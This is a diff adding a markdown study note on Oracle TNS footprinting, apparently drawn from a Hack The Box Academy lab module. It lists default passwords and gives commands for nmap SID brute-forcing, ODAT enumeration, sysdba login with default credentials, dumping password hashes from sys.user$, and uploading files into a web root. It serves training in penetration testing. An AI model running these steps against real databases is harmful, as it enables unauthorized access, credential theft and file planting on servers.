@@ -1,0 +1,114 @@
+# Oracle TNS
+
+## **Oracle TNS Overview**
+
+- **TNS (Transparent Network Substrate)**: Protocol for communication between Oracle clients & DB servers.
+    
+- Supports **TCP/IP, UDP, IPX/SPX, AppleTalk**, now also **IPv6 & SSL/TLS**.
+    
+- Key features: **name resolution, connection management, load balancing, encryption, security**.
+    
+- Used in **enterprise environments**: healthcare, finance, retail.
+    
+
+---
+
+## **Default Configuration**
+
+- **Listener Port:** TCP/1521 (changeable).
+    
+- **Config files:**
+    
+    - `$ORACLE_HOME/network/admin/tnsnames.ora` → client-side service resolution
+        
+    - `$ORACLE_HOME/network/admin/listener.ora` → server-side listener setup
+        
+- **Security:** basic host authentication, encrypted communication via Oracle Net Services.
+    
+- **Default passwords:**
+    
+    - Oracle 9: `CHANGE_ON_INSTALL`
+        
+    - Oracle DBSNMP: `dbsnmp`
+        
+
+**Example tnsnames.ora entry:**
+
+`ORCL =   (DESCRIPTION =     (ADDRESS_LIST =       (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))     )     (CONNECT_DATA =       (SERVER = DEDICATED)       (SERVICE_NAME = orcl)     )   )`
+
+**Example listener.ora entry:**
+
+`SID_LIST_LISTENER =   (SID_LIST =     (SID_DESC =       (SID_NAME = PDB1)       (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)       (GLOBAL_DBNAME = PDB1)     )   )  LISTENER =   (DESCRIPTION_LIST =     (DESCRIPTION =       (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))       (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))     )   )`
+
+---
+
+## **PL/SQL Exclusion List**
+
+- User-created blacklist to block execution of certain PL/SQL packages.
+    
+- File location: `$ORACLE_HOME/sqldeveloper/PlsqlExclusionList.txt`
+    
+
+---
+
+## **Tools & Setup for Oracle DB Enumeration**
+
+**Pwnbox setup commands:**
+
+`# Download Oracle Instant Client wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip  # Extract & setup sudo mkdir -p /opt/oracle sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH export PATH=$LD_LIBRARY_PATH:$PATH source ~/.bashrc  # ODAT setup git clone https://github.com/quentinhardy/odat.git cd odat/ pip install python-libnmap cx_Oracle python3-scapy colorlog termcolor passlib pycryptodome git submodule init && git submodule update`
+
+**Test ODAT installation:**
+
+`./odat.py -h`
+
+---
+
+## **Footprinting Oracle TNS**
+
+- **Default port:** 1521
+    
+- **Nmap scan for listener:**
+    
+
+`sudo nmap -p1521 -sV <IP> --open # Example output: Oracle TNS listener 11.2.0.2.0 (unauthorized)`
+
+- **SID brute-forcing:**
+    
+
+`sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute # Example found SID: XE`
+
+- **ODAT scan:**
+    
+
+`./odat.py all -s <IP> # Enumerates DB names, users, versions, misconfigurations, valid credentials`
+
+---
+
+## **Connecting & Interacting**
+
+- **SQL*Plus login:**
+    
+
+`sqlplus scott/tiger@<IP>/XE sqlplus scott/tiger@<IP>/XE as sysdba`
+
+- **Basic enumeration:**
+    
+
+`-- List all tables select table_name from all_tables;  -- Check user privileges select * from user_role_privs;  -- Extract password hashes select name, password from sys.user$;`
+
+---
+
+## **Exploitation / Post-Access**
+
+- **File upload (requires web server path knowledge):**
+    
+
+`echo "Oracle File Upload Test" > testing.txt ./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt curl -X GET http://<IP>/testing.txt`
+
+- Can upload files to common paths:
+    
+    - Linux: `/var/www/html`
+        
+    - Windows: `C:\inetpub\wwwroot`
+# References 
+https://academy.hackthebox.com/module/112/section/2117
